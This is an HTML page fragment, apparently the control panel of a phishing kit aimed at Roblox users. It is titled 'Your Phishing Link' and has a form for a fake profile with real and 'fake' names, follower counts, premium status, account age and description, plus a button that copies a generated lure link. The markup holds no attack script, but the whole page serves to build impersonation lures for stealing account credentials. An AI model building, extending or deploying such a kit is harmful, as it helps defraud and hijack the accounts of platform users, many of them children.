<div class="container px-6 py-24 mx-auto lg:py-32">
  <div class="flex flex-col md:flex-row gap-8">
    <div class="w-full md:w-1/2">
      <div class="flex items-center space-x-3 rtl:space-x-reverse mb-8">
        <img src="./assets/img/roblox.png" class="h-8 rounded-md" />
        <span
          class="self-center text-3xl font-semibold whitespace-nowrap dark:text-white"
          >Your Phishing Link</span
        >
      </div>

      <div
        class="max-w-[550px] p-[16px] bg-black/30 border border-white/10 rounded-lg p-4"
      >
        <div class="flex space-x-5 rtl:space-x-reverse mb-8">
          <div class="flex h-[150px] w-[150px] rounded-md bg-black/20">
            <img
              class="h-full w-full bg-zinc-900 rounded-lg"
              id="avatarCard"
              src=""
              alt=""
            />
          </div>
          <div class="mt-2 flex flex-col">
            <h4 class="text-5xl font-bold" id="displayNameCard"></h4>
            <p class="text-white/50 text-lg font-normal" id="realNameCard"></p>
            <div class="mt-4 flex gap-4 md:!gap-14">
              <div class="flex flex-col">
                <h3 class="text-2xl font-bold" id="friendsCard">0</h3>
                <p class="text-white/80 text-sm font-normal">Friends</p>
              </div>
              <div class="flex flex-col">
                <h3 class="text-2xl font-bold" id="followersCard">0</h3>
                <p class="text-white/80 text-sm font-normal">Followers</p>
              </div>
              <div class="flex flex-col">
                <h3 class="text-2xl font-bold" id="followingCard">0</h3>
                <p class="text-white/80 text-sm font-normal">Following</p>
              </div>
            </div>
          </div>
        </div>
        <div>
          <div
            class="flex gap-2 items-center bg-zinc-900 rounded-lg p-2 w-full mt-5"
          >



            <select
              id="linkCard"
              class="flex-1 bg-transparent outline-none text-sm md:text-base text-white/50 pl-3"
            >
            </select>



            <button onclick="copyContent(document.getElementById('linkCard').value)"
              class="bg-zinc-900 px-4 py-2 rounded-lg hover:bg-zinc-700 transition-colors flex items-center gap-2"
            >
              <svg
                xmlns="http://www.w3.org/2000/svg"
                class="h-5 w-5"
                fill="none"
                viewBox="0 0 24 24"
                stroke="currentColor"
              >
                <path
                  stroke-linecap="round"
                  stroke-linejoin="round"
                  stroke-width="2"
                  d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
                />
              </svg>
              Copy
            </button>
          </div>
        </div>
      </div>
    </div>

    <!-- Right Section -->
    <div class="w-full md:w-1/2">
      <h1 class="text-3xl font-bold mb-8">Customize Your Link</h1>
      <div class="space-y-6 bg-black/30 border border-white/10 rounded-lg p-4">
        <!-- Real Name and Display Name -->
        <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
          <div>
            <label for="realName" class="block text-sm font-medium mb-2"
              >Real Name</label
            >
            <input
              type="text"
              id="realName"
              placeholder="Roblox"
              class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
          </div>
          <div>
            <label for="fakeName" class="block text-sm font-medium mb-2"
              >Fake Name</label
            >
            <input
              type="text"
              id="fakeName"
              placeholder="Shockify"
              class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
          </div>
          <div>
            <label for="displayName" class="block text-sm font-medium mb-2"
              >Display Name</label
            >
            <input
              type="text"
              id="displayName"
              placeholder="TheBest"
              class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            />
          </div>
        </div>

        <div class="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div>
            <label for="friends" class="block text-sm font-medium mb-2"
              >Friends</label
            >
            <div class="flex bg-zinc-800 rounded-lg overflow-hidden">
              <button
                type="button"
                onclick="decrement('friends')"
                class="px-4 py-2 hover:bg-zinc-700 transition-colors"
              >
                -
              </button>
              <input
                type="number"
                id="friends"
                value="0"
                class="w-full bg-transparent text-center focus:outline-none"
                min="0"
                onchange="validateNumber(this)"
              />
              <button
                type="button"
                onclick="increment('friends')"
                class="px-4 py-2 hover:bg-zinc-700 transition-colors"
              >
                +
              </button>
            </div>
          </div>
          <div>
            <label for="followers" class="block text-sm font-medium mb-2"
              >Followers</label
            >
            <div class="flex bg-zinc-800 rounded-lg overflow-hidden">
              <button
                type="button"
                onclick="decrement('followers')"
                class="px-4 py-2 hover:bg-zinc-700 transition-colors"
              >
                -
              </button>
              <input
                type="number"
                id="followers"
                value="0"
                class="w-full bg-transparent text-center focus:outline-none"
                min="0"
                onchange="validateNumber(this)"
              />
              <button
                type="button"
                onclick="increment('followers')"
                class="px-4 py-2 hover:bg-zinc-700 transition-colors"
              >
                +
              </button>
            </div>
          </div>
          <div>
            <label for="following" class="block text-sm font-medium mb-2"
              >Following</label
            >
            <div class="flex bg-zinc-800 rounded-lg overflow-hidden">
              <button
                type="button"
                onclick="decrement('following')"
                class="px-4 py-2 hover:bg-zinc-700 transition-colors"
              >
                -
              </button>
              <input
                type="number"
                id="following"
                value="0"
                class="w-full bg-transparent text-center focus:outline-none"
                min="0"
                onchange="validateNumber(this)"
              />
              <button
                type="button"
                onclick="increment('following')"
                class="px-4 py-2 hover:bg-zinc-700 transition-colors"
              >
                +
              </button>
            </div>
          </div>
        </div>

        <!-- Premium and Status -->
        <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
          <div>
            <label for="premium" class="block text-sm font-medium mb-2"
              >Premium</label
            >
            <select
              id="premium"
              class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            >
              <option value="yes">Yes</option>
              <option value="no">No</option>
            </select>
          </div>
          <div>
            <label for="status" class="block text-sm font-medium mb-2"
              >Status</label
            >
            <select
              id="status"
              class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
            >
              <option value="online">Online</option>
              <option value="playing">In Game</option>
              <option value="offline">Offline</option>
            </select>
          </div>
        </div>

        <!-- Creation Date -->
        <div>
          <label for="creationDate" class="block text-sm font-medium mb-2"
            >Creation Date</label
          >
          <input
            type="date"
            id="creationDate"
            class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
          />
        </div>

        <!-- Description -->
        <div>
          <label for="description" class="block text-sm font-medium mb-2"
            >Description</label
          >
          <textarea
            id="description"
            style="resize: none"
            rows="4"
            class="w-full px-3 py-2 bg-zinc-800 rounded-lg border border-zinc-700 focus:ring-2 focus:ring-blue-500 focus:border-transparent"
          ></textarea>
        </div>

        <!-- Save Button -->
        <button
          id="submit"
          class="w-full bg-indigo-500 hover:bg-indigo-400 text-white font-medium py-2 px-4 rounded-lg transition duration-200"
        >
          Save Changes
        </button>
      </div>
    </div>
  </div>
</div>
